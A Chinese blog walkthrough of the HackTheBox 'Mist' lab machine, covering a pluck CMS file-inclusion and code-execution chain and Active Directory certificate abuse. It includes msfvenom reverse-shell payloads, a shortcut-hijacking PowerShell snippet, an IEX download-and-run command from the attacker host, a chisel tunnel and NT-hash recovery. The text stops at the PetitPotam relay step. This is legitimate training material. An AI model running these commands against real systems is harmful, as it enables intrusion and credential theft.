<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Mist - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Mist 10.10.11.17                                                                                                              端口扫描只有80: 12345678910111213141516">
<meta property="og:type" content="article">
<meta property="og:title" content="Mist - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2024/04/05/Mist-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Mist 10.10.11.17                                                                                                              端口扫描只有80: 12345678910111213141516">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040101.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040102.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040103.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040104.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040105.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040106.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040107.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040108.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040109.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040110.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040111.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040112.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040113.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040114.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040115.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040116.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040117.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040118.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040119.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040120.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040121.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040122.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040123.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040124.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040125.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040126.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040127.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040130.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040128.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040129.jpg">
<meta property="article:published_time" content="2024-04-05T01:04:05.000Z">
<meta property="article:modified_time" content="2024-10-28T05:16:39.996Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040101.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Mist - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Mist - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2024-04-05T01:04:05.000Z" itemprop="datePublished" class="page-time">
  2024-04-05
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#modules"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">modules</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LFI"><span class="post-toc-number">4.</span> <span class="post-toc-text">LFI</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#plunk"><span class="post-toc-number">5.</span> <span class="post-toc-text">plunk</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pluck-rce"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">pluck rce</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息"><span class="post-toc-number">6.</span> <span class="post-toc-text">信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lnk-hijack"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">lnk hijack</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#brandon"><span class="post-toc-number">7.</span> <span class="post-toc-text">brandon</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Certificate"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">Certificate</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#PetitPotam"><span class="post-toc-number">8.</span> <span class="post-toc-text">PetitPotam</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#relay-amp-shadow-creds"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">relay &amp; shadow creds</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#enableWebdev-ps1"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">enableWebdev.ps1</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pass-the-Certificate"><span class="post-toc-number">9.</span> <span class="post-toc-text">Pass the Certificate</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ms01-hashdump"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">ms01 hashdump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">10.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Sharon-Mullard"><span class="post-toc-number">11.</span> <span class="post-toc-text">Sharon.Mullard</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Winrm"><span class="post-toc-number">11.1.</span> <span class="post-toc-text">Winrm</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gmsa"><span class="post-toc-number">11.2.</span> <span class="post-toc-text">gmsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#svc-ca"><span class="post-toc-number">12.</span> <span class="post-toc-text">svc_ca$</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AddKeyCredentialLink"><span class="post-toc-number">12.1.</span> <span class="post-toc-text">AddKeyCredentialLink</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#svc-cabackup"><span class="post-toc-number">13.</span> <span class="post-toc-text">svc_cabackup</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ADCS"><span class="post-toc-number">14.</span> <span class="post-toc-text">ADCS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ESC13"><span class="post-toc-number">14.1.</span> <span class="post-toc-text">ESC13</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#esc13-abuse"><span class="post-toc-number">14.2.</span> <span class="post-toc-text">esc13 abuse</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#BackupSvcAuthentication"><span class="post-toc-number">14.3.</span> <span class="post-toc-text">BackupSvcAuthentication</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#registry"><span class="post-toc-number">14.4.</span> <span class="post-toc-text">registry</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">15.</span> <span class="post-toc-text">root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hashdump"><span class="post-toc-number">15.1.</span> <span class="post-toc-text">hashdump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">16.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Mist-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Mist - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2024-04-05 09:04:05" datetime="2024-04-05T01:04:05.000Z"  itemprop="datePublished">2024-04-05</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Mist" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Mist</a></li>
<li>10.10.11.17</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040101.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>只有80:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.17</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-01 13:21 CST</span><br><span class="line">Nmap scan report for 10.10.11.17</span><br><span class="line">Host is up (0.073s latency).</span><br><span class="line">Not shown: 999 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1</span><br><span class="line">| http-title: Mist - Mist</span><br><span class="line">|_Requested resource was http://10.10.11.17/?file=mist</span><br><span class="line">|_http-generator: pluck 4.7.18</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-robots.txt: 2 disallowed entries</span><br><span class="line">|_/data/ /docs/</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 79.55 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>很简单的页面，powered by pluck</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040102.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>robots.txt里可以看到两个目录，直接访问是跳到首页：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;data&#x2F;</span><br><span class="line">Disallow: &#x2F;docs&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h2><p>进一步扫描目录可以发现modules，可以直接查看：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.17/data/ -x php</span><br><span class="line"></span><br><span class="line">/Image                (Status: 301) [Size: 339] [--&gt; http://10.10.11.17/data/Image/]</span><br><span class="line">/Themes               (Status: 301) [Size: 340] [--&gt; http://10.10.11.17/data/Themes/]</span><br><span class="line">/image                (Status: 301) [Size: 339] [--&gt; http://10.10.11.17/data/image/]</span><br><span class="line">/inc                  (Status: 301) [Size: 337] [--&gt; http://10.10.11.17/data/inc/]</span><br><span class="line">/index.html           (Status: 200) [Size: 48]</span><br><span class="line">/modules              (Status: 301) [Size: 341] [--&gt; http://10.10.11.17/data/modules/]</span><br><span class="line">/settings             (Status: 301) [Size: 342] [--&gt; http://10.10.11.17/data/settings/]</span><br><span class="line">/themes               (Status: 301) [Size: 340] [--&gt; http://10.10.11.17/data/themes/]</span><br><span class="line">/trash                (Status: 301) [Size: 339] [--&gt; http://10.10.11.17/data/trash/]</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040103.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>modules中可以看到<strong>albums</strong>，存在LFI：</p>
<ul>
<li>Inclusion of files without authentication · Issue #122 · pluck-cms/pluck<br><a href="https://github.com/pluck-cms/pluck/issues/122" target="_blank" rel="noopener">https://github.com/pluck-cms/pluck/issues/122</a></li>
</ul>
<p>根据其中内容，在 <a href="http://10.10.11.17/data/settings/modules/albums/" target="_blank" rel="noopener">http://10.10.11.17/data/settings/modules/albums/</a> 可以看到 admin_backup.php：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040104.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后通过LFI去读取这个文件,得到一个hash：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040105.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>可以破解出密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e</span><br><span class="line"></span><br><span class="line">lexypoo97</span><br></pre></td></tr></table></figure>

<h1 id="plunk"><a href="#plunk" class="headerlink" title="plunk"></a>plunk</h1><p>然后就可以回到首页，使用得到的密码登录admin：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040106.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040107.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="pluck-rce"><a href="#pluck-rce" class="headerlink" title="pluck rce"></a>pluck rce</h2><p>根据版本号4.7.18,可以搜到相关命令漏洞：</p>
<ul>
<li>Pluck v4.7.18 - Remote Code Execution (RCE) - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/51592" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/51592</a></li>
</ul>
<p>基本就是上传一个包含恶意php的zip作为module安装来获取shell,通过webshell再来获取稳定shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp -f raw LHOST=10.10.16.13 LPORT=4444 -o miao.php</span><br><span class="line"></span><br><span class="line">zip miao.zip miao.php</span><br><span class="line"></span><br><span class="line">options -&gt; manage modules -&gt; install a module </span><br><span class="line"></span><br><span class="line">http://10.10.11.17/data/modules/miao/miao.php</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe  LHOST=10.10.16.13 LPORT=4445 -o miao.exe</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\files</span><br><span class="line"></span><br><span class="line">upload miao.exe</span><br><span class="line">execute -H -f miao.exe</span><br></pre></td></tr></table></figure>

<p>打到MS01的本地svc_web：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040108.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>基础枚举，发现一个网络共享，里面是几个快捷方式：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040109.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040110.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="lnk-hijack"><a href="#lnk-hijack" class="headerlink" title="lnk hijack"></a>lnk hijack</h2><p>网络共享就会有其他人访问，尝试修改其中的lnk文件：</p>
<ul>
<li>Phishing: OLE + LNK | Red Team Notes<br><a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk" target="_blank" rel="noopener">https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$objShell</span> = <span class="built_in">New-Object</span> -ComObject WScript.Shell</span><br><span class="line"><span class="variable">$lnk</span> = <span class="variable">$objShell</span>.CreateShortcut(<span class="string">"c:\Common Applications\Calculator.lnk"</span>)</span><br><span class="line"><span class="variable">$lnk</span>.TargetPath = <span class="string">"C:\xampp\htdocs\files\miao.exe"</span></span><br><span class="line"><span class="variable">$lnk</span>.Save()</span><br></pre></td></tr></table></figure>

<p>然后等几分钟自动执行，得到MS01上域用户brandon：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040111.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="brandon"><a href="#brandon" class="headerlink" title="brandon"></a>brandon</h1><p>brandon用户是MIST域用户，基础枚举获取dc ip，打通隧道：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IEX ((new-object net.webclient).downloadstring('http://10.10.16.13:7777/adPEAS.ps1'))</span><br><span class="line">invoke-adpeas</span><br><span class="line"></span><br><span class="line">192.168.100.100 DC01.mist.htb</span><br><span class="line"></span><br><span class="line">upload chisel.exe</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse</span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">chisel.exe client 10.10.16.13:9999 R:socks</span><br></pre></td></tr></table></figure>

<h2 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h2><p>brandon也有一个证书，但没有可导出的私钥,那就自己请求一个新证书,然后pass the Certificate得到brandon的hash：</p>
<ul>
<li>Pass the Certificate | The Hacker Recipes<br><a href="https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate" target="_blank" rel="noopener">https://www.thehacker.recipes/a-d/movement/kerberos/pass-the-certificate</a></li>
<li>dirkjanm/PKINITtools: Tools for Kerberos PKINIT and relaying to AD CS<br><a href="https://github.com/dirkjanm/PKINITtools" target="_blank" rel="noopener">https://github.com/dirkjanm/PKINITtools</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs&gt; gci Cert:\CurrentUser\UserDS\ | select *</span><br><span class="line"></span><br><span class="line">Brandon.Keywarp@mist.htb</span><br><span class="line">mist-DC01-CA</span><br><span class="line"></span><br><span class="line">Certify.exe cas /ca:DC01\mist-DC01-CA</span><br><span class="line">Certify.exe find ca:DC01\mist-DC01-CA</span><br><span class="line"></span><br><span class="line">User</span><br><span class="line"></span><br><span class="line">Certify.exe request /ca:DC01\mist-DC01-CA /template:User</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 自己设置导出密码</span></span><br><span class="line"></span><br><span class="line">proxychains4 python3 ~/Tools/PKINITtools/gettgtpkinit.py -cert-pfx ./cert.pfx -pfx-pass "miao" MIST.HTB/Brandon.Keywarp Brandon.Keywarp.ccache -dc-ip 192.168.100.100 -v</span><br><span class="line"></span><br><span class="line">4e796b9c8a5abf10cae7495bc5bd0844fb65f7b46283bc6a511bb78031c14479</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./Brandon.Keywarp.ccache</span><br><span class="line"></span><br><span class="line">proxychains4 python3 ~/Tools/PKINITtools/getnthash.py mist.htb/Brandon.Keywarp -key 4e796b9c8a5abf10cae7495bc5bd0844fb65f7b46283bc6a511bb78031c14479</span><br><span class="line"></span><br><span class="line">Recovered NT Hash</span><br><span class="line">db03d6a77a2205bc1d07082740626cc9</span><br></pre></td></tr></table></figure>

<h1 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h1><p>现在有了一个域用户，接下来就可以尝试强制访问：</p>
<ul>
<li>NTLM relaying to AD CS - On certificates, printers and a little hippo - dirkjanm.io<br><a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/" target="_blank" rel="noopener">https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/</a></li>
<li>WebClient abuse (WebDAV) | The Hacker Recipes<br><a href="https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient" target="_blank" rel="noopener">https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient</a></li>
</ul>
<p>在ms01上启用webdav client</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload enableWebdev.ps1</span><br><span class="line"></span><br><span class="line">PS C:\xampp\htdocs\files&gt;.\enableWebdev.ps1</span><br></pre></td></tr></table></figure>

<p>然后转发端口，打PetitPotam：</p>
